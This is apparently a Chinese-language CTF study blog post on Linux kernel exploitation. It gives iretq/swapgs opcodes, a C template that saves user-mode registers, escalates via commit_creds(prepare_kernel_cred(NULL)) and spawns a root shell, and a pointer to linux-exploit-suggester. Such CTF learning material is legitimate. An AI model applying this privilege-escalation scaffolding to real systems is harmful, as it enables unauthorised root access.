---
layout: post
tags: [kernel_pwn]
title: "kernel pwn module"
author: wsxk
date: 2022-10-11
comments: true
---

- [1. 常用字节码](#1-常用字节码)
- [2. kernel module](#2-kernel-module)
- [3. 如何找洞?](#3-如何找洞)
  - [3.1 LES](#31-les)



PS:更新与`2024-11-11`<br>

## 1. 常用字节码<br>

    iretq: 48 cf
    swapgs: 0f 01 f8

## 2. kernel module<br>
以目前浅薄的kernel pwn经验，总结了一套kernel pwn时会用到的基本操作，不定时更新~<br>
```c
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>

size_t commit_creds=0;
size_t prepare_kernel_cred =0;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_status(void){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void get_root_shell(void){
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

//ret2usr
void get_root_privilege(){
    //printf("use ret2usr\n"); //don't use user func in kernel space!
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```

## 3. 如何找洞?<br>
有的CTF题目会给一个ko文件（内核驱动模块），可以通过ida逆向分析来挖掘漏洞。那么，如果CTF题目只给了一个linux kernel，你又该如何应对呢？<br>

### 3.1 LES<br>
这就不得不提到一个牛逼的开源工具`LES(linux-exploit-suggester)`了，其已在github上开源：[https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)<br>
通过下载其脚本并运行，我们可以得知两件事:<br>
```
1. 当前linux kernel 可能能够利用的 cve漏洞
2. 当前linux kernel 开启/关闭的 安全加固措施
```


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>